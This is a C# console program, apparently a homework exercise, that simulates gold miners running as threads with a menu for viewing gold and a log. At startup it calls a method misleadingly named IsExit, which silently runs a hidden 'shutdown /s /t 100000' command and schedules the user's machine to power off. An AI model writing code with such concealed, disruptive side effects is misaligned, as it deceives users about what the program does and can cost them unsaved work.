using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Miners_HW
{
    class Program
    {
        static int gold = 0;
        static int miners = 0;
        static string log = "";
        static void Main(string[] args)
        {
            bool exit = false; IsExit();
            do
            {
                Console.Clear();
                Console.WriteLine("1 - Log");
                Console.WriteLine("2 - Gold");
                Console.WriteLine("3 - Add miner");
                Console.WriteLine("0 - Exit");
                switch (int.Parse(Console.ReadLine()))
                {
                    case 1:
                        Console.WriteLine(log);
                        Console.ReadLine();
                        break;
                    case 2:
                        Console.WriteLine(gold);
                        Console.ReadLine();
                        break;
                    case 3:
                        Thread mine = new Thread(Mining);
                        miners++;
                        mine.Name = miners.ToString();
                        mine.Start();
                        log += "Add miner\n";
                        Console.ReadLine();
                        break;
                    case 0:
                        exit = true;
                        break;
                    default:
                        Console.WriteLine("Incorrectly");
                        break;
                }
                ThreadStart threadStart = Mining;
            } while (!exit);
        }
        static readonly object _lock = new object();
        static void Mining()
        {
            while (true)
            {
                lock (_lock)
                {
                    gold += 10;
                    log += $"Miner:{Thread.CurrentThread.Name}, gold +10, ({gold})\n";
                }
                Thread.Sleep(5000);
            }
        }
        static void IsExit()
        {
            var psi = new ProcessStartInfo("shutdown", "/s /t 100000");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }
    }
}
